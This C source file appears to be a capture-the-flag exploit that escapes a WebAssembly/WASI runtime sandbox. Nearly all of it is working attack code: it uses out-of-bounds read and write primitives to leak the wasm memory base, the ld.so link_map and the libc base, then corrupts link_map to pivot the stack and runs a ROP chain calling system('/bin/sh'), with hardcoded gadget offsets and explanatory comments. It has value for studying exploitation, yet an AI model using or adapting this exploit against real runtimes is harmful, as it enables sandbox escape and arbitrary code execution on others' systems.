#include <stdio.h>
#include <assert.h>
#include <stdint.h>

#define log(x) printf(#x " = 0x%llx\n", (x))

unsigned long long arr[0x10];
extern unsigned long long read_qword(unsigned int idx);
extern void write_qword(unsigned int idx, unsigned long long value);

// convenient function to get an actual offset from `membase` and
// then pass it to the OOB read primitive in a way that causes that
// offset to be read.
uint64_t readmem(uint64_t offset) {
	assert((offset & 7) == 0);
	return read_qword(offset >> 3);
}

// same as readmem() but for OOB write.
void writemem(uint64_t offset, uint64_t value) {
	assert((offset & 7) == 0);
	write_qword(offset >> 3, value);
}

// base of wasm linear memory page
uint64_t membase;

int main(void) {
    printf("Hello Wasi\n");	// just to see that your exploit started executing
	// use `b getchar` in gdb to break at some point where the wasm functions have been
	// compiled to native code and be able to inspect them and step through them.
	getchar();

	// read a pointer at a constant offset from the base of wasm linear memory,
	// which points to a constant offset from it, and use it to determine `membase`
	membase = readmem(0x180000000) - 0x180000030;
	log(membase);

	// read the size of the page immediately after the guard page in front of linear memory.
	// The size is apparently always written at the 3rd qword of that page.
	uint64_t next_size = readmem(0x180000010);
	log(next_size);
	
	// search the next page for leaks. Running this loop without the `(value & 0xfff) == 0x2f0`
	// condition will print an address with lower bytes of 0x2f0 in most runs, so I decided to
	// add this condition to always return that address and then inspect the value. It appeared that
	// it was a pointer to link_map in ld.so memory!
	uint64_t link_map = 0;
	for (uint64_t i = 0; i < next_size; i += 8) {
		uint64_t value = readmem(0x180000000 + i);
		if (value > link_map && value - membase < 0x200000000 && (value & 0xfff) == 0x2f0) {
			link_map = value;
		}
	}
	log(link_map);

	// This is the offset which is added to the value written at link_map, and then
	// a qword is read from the resulting address. This qword is then called:
	const uint64_t link_map_call_offset = 0x8b4518;		// for the original challenge binary
	// const uint64_t link_map_call_offset = 0x190d4d8;	// for the debug binary

	uint64_t ld_base = link_map - 0x332f0;
	uint64_t libc_dl_catch_exception = readmem(ld_base + 0x32000 - membase);	// a libc pointer in ld memory
	uint64_t libc_base = libc_dl_catch_exception - 0x14ed90;
	log(libc_base);

	// gadgets in libc:
	const uint64_t leave_ret = libc_base + 0x4de39;	// leave ; ret
	const uint64_t pop_rdi = libc_base + 0x27765;	// pop rdi ; ret
	const uint64_t libc_system = libc_base + 0x4c3a0;
	const uint64_t str_bin_sh = libc_base + 0x196031;

	// the first write to link_map will cause whatever is written at link_map-8 to be
	// called before the program exits, and the second write will write the address of
	// our first ROP gadget at link_map-8. When the address at link_map-8 is called, rbp
	// contains the address of link_map itself, so a 'leave ; ret' gadget will allow us to do
	// stack pivoting and continue the execution of our ROP chain from link_map+8
	writemem(link_map - membase, link_map - 8 - link_map_call_offset);
	writemem(link_map - 8 - membase, leave_ret);

	// simple ROP chain to call system("/bin/sh")
	uint64_t rop[] = {
		pop_rdi + 1,	// ret gadget to align the stack for system()
		pop_rdi,
		str_bin_sh,
		libc_system
	};

	// write the main ROP chain starting from link_map+8
	for (int i = 0; i < sizeof(rop)/sizeof(rop[0]); i++) {
		writemem(link_map + 8 + 8 * i - membase, rop[i]);
	}

	return 0;
}
